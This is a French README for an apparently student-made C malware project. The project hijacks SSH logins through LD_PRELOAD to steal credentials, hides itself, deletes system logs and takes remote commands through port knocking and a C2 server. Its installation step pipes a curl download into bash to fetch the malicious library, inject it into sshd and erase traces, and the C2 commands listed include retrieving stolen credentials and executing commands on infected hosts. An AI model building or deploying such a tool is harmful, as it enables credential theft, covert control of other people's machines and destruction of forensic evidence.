# README - Malware LD_PRELOAD - 

Crée par Zacharie ROGER en classe 3SI1.

## Description
Ce projet est un malware en C utilisant la technique **LD_PRELOAD** pour intercepter et extraire les informations d'identification (credentials) des connexions SSH. Il inclut des fonctionnalités avancées de furtivité, d'anti-forensic, et de contrôle à distance via un serveur C2 (Command & Control).

## Fonctionnalités principales
- **Extraction des credentials SSH** : interception des identifiants des utilisateurs se connectant via OpenSSH.
- **Empêchement de l'ouverture d'un fichier spécifique**.
- **Techniques anti-forensic** : suppression des logs système.
- **Port Knocking** : pour exécuter des commandes à distance de manière discrète.
- **Désinstallation cachée** : désactivation du malware via un signal spécifique envoyé par le serveur C2.

## Installation
1. **Téléchargement et configuration :**
   ```bash
   bash configure.sh ou curl -s http://localhost/configure.sh | bash
   ```
   Ce script :
   - Télécharge la bibliothèque malveillante.
   - Configure `LD_PRELOAD` pour charger le malware à chaque session.
   - Redémarre SSHD avec LD_PRELOAD pour injecter la librairie.
   - Masque la présence du malware.
   - Efface les logs pour réduire les traces.

## Utilisation du serveur C2
Le serveur C2 permet de :
- Lister les hôtes infectés.
- Récupérer les credentials volés.
- Envoyer des commandes aux clients.
- Déclencher la désinstallation du malware.

### Lancement du serveur C2 :
```bash
./c2_server
```

### Commandes disponibles :
- `list` : Affiche les hôtes infectés.
- `credentials` : Montre les identifiants volés.
- `exec <commande>` : Exécute une commande sur un client infecté.
- `uninstall <ID_client>` : Désinstalle le malware sur la machine ciblée.

## Structure du projet
- `src/` : Code source du malware.
- `include/` : Fichiers d'en-tête.
- `c2_server/` : Code source du serveur C2.
- `configure.sh` : Script d'installation et de dissimulation.
- `Makefile` : Compilation du projet.

## Compilation
```bash
make
```
